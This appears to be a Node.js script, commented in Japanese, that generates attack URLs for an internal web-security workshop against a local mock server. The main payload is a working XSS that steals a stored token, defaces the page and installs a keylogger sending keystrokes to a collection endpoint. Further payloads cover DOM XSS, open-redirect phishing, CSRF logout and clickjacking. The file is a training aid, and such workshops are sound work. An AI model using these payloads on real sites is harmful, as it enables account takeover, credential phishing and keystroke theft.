#!/usr/bin/env node
/**
 * 【教育用】攻撃URL生成スクリプト（いわゆる「ペイロードビルダー」）
 *
 * 出力される URL はすべて 127.0.0.1:9999（attack-server.mjs）向け。
 * 勉強会ではこれをブラウザに貼って攻撃を再現する。
 *
 * 使い方:
 *   node examples/security-workshop/build-links.mjs
 *   （attack-server.mjs を別ポートで動かす場合は PORT=10000 node ... と揃える）
 */
const PORT = Number(process.env.PORT) || 9999;
const BASE = `http://127.0.0.1:${PORT}`;

/**
 * ペイロード: トークン窃取 + 画面改ざん + キーロガー。
 *
 * 知識ポイント: innerHTML に <script> を入れても実行されない（HTML5 仕様）。
 * そこで <img src=x onerror="..."> のエラー発火を初動に使う。
 * 文字列はすべて single quote、属性区切りだけ double quote にして URL 安全化。
 */
const payload1 =
  `<img src=x onerror="` +
  `var t=localStorage.getItem('shibuya.demo.token')||'(未ログイン)';` +
  `var d=document.createElement('div');` +
  `d.style.cssText='position:fixed;inset:0;background:#5c0000;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif;color:#ffd7d7';` +
  `d.innerHTML='<h1 style=margin:0;font-size:32px>☠ このページは乗っ取られました</h1><p>盗み取ったトークン: '+t+'</p><p>以後のキー入力も記録・送信されます</p>';` +
  `document.body.appendChild(d);` +
  `new Image().src='/collect?d='+encodeURIComponent('TOKEN:'+t)+'&src=xss';` +
  `document.addEventListener('keypress',function(e){new Image().src='/collect?d='+encodeURIComponent('KEY:'+e.key)+'&src=keylogger';},false);` +
  `">`;

/** ペイロード2: ハッシュ経由の DOM XSS（アラートを出すだけの軽量版） */
const payload2 = `<img src=x onerror="alert('DOM XSS：ハッシュ経由で実行されました')">`;

const rows = [
  ['演習1 反射型XSS（トークン窃取＋改ざん＋キーロガー）',
   `${BASE}/?q=${encodeURIComponent(payload1)}`,
   'デモログインを押してトークンを保存してから訪問すると、トークンが /panel に届く。以後のキー入力も記録される。'],
  ['演習1b 検索ボックスに直接ペイロードを貼る（alert 版）',
   `${BASE}/?q=${encodeURIComponent(`<img src=x onerror="alert('XSS！'+localStorage.getItem('shibuya.demo.token'))">`)}`,
   '手入力でもXSSになることの確認用。'],
  ['演習2 DOM XSS（location.hash 経由）',
   `${BASE}/vulnerable-page#profile=${encodeURIComponent(payload2)}`,
   'URLの # 以降はサーバに届かない＝アクセスログにも残らない、を体感する。'],
  ['演習3 オープンリダイレクト → フィッシング',
   `${BASE}/?next=${encodeURIComponent(`//127.0.0.1:${PORT}/fake-login`)}`,
   '「//」始まりでバリデーションを素通りし、偽ログインページへ飛ぶ。入力すると PHISH として回収される。'],
  ['演習4 CSRF（GETログアウト）',
   `${BASE}/?action=logout`,
   '別タブでデモログイン→このURLを踏むと、何もされていなくてもログアウト状態にさせられる。'],
  ['演習5 クリックジャッキング',
   `${BASE}/attacker-frame`,
   '透明 iframe でクリックを奪う仕組み。iframe の opacity を 0→0.1 に変えると可視化できる。'],
];

console.log('==============================================');
console.log(' 社内セキュリティ勉強会 — 攻撃URL一覧');
console.log(' （attack-server.mjs を起動してから使う）');
console.log('==============================================\n');
for (const [title, url, note] of rows) {
  console.log(`◆ ${title}`);
  console.log(`  ${url}`);
  console.log(`  ${note}\n`);
}
console.log('攻撃者パネル: ' + BASE + '/panel');
console.log('※ 全演習とも 127.0.0.1 のローカルモック内で完結します。\n');
